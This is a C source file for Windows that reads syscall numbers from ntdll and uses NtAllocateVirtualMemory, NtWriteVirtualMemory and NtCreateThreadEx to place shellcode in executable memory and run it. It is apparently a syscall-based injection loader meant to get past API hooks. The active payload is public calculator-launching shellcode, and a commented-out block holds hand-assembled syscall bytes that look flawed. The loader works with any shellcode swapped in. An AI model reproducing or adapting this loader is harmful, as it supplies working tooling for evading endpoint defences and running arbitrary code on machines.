// #include <ntifs.h>
#include <windows.h>  
#include <stdio.h>
#include "syscalls.h"

// Declare global variables to hold syscall numbers
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;

int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
    // This is typically located at the 4th byte of the function
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];

    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];

    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];


    // Shellcode - open windows calculator
    // https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm
    unsigned char shellcode[] = \
 "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";
    // unsigned char shellcode[] =
    //     "\x48\x31\xc0"                          // xor rax, rax
    //     "\x48\x89\xc1"                          // mov rcx, rax
    //     "\x48\x89\xc2"                          // mov rdx, rax
    //     "\x48\x89\xc3"                          // mov rbx, rax (clear rbx for later use)

    //     // Allocate memory for the file name string using NtAllocateVirtualMemory
    //     "\xb8\x18\x00\x00\x00"                  // mov eax, NtAllocateVirtualMemory
    //     "\x4c\x8d\x1c\x24"                      // lea r11, [rsp] (stack pointer as base)
    //     "\x49\xc7\xc0\xff\xff\xff\xff"          // mov r8, -1 (PROCESS_HANDLE = -1)
    //     "\x49\x89\xe9"                          // mov r9, rbp (address of buffer)
    //     "\x49\xba\x00\x10\x00\x00\x00\x00\x00\x00" // mov r10, 0x1000 (allocation size)
    //     "\x49\x89\xd8"                          // mov rdx, rbx (MEM_COMMIT | MEM_RESERVE)
    //     "\x4c\x31\xcf"                          // xor r15, r15
    //     "\x0f\x05"                              // syscall

    //     // Write the file name string to the allocated memory
    //     "\x48\x89\xc6"                          // mov rsi, rax (store allocated buffer in rsi)
    //     "\x48\xbe\\\x5c\x3f\x3f\x5c\x6e\x65\x77" // movabs rsi, '\\??\\newfile.txt'
    //     "\x48\x89\x06"                          // mov [rsi], rax

    //     // Call NtCreateFile
    //     "\x48\x31\xc0"                          // xor rax, rax
    //     "\x48\x89\xc7"                          // mov rdi, rax
    //     "\xb8\x55\x00\x00\x00"                  // mov eax, NtCreateFile
    //     "\x0f\x05"                              // syscall
    //     "\x48\x31\xc0"                          // xor rax, rax
    //     "\x0f\x05";                             // syscall (exit)

    
    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    
    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);
}
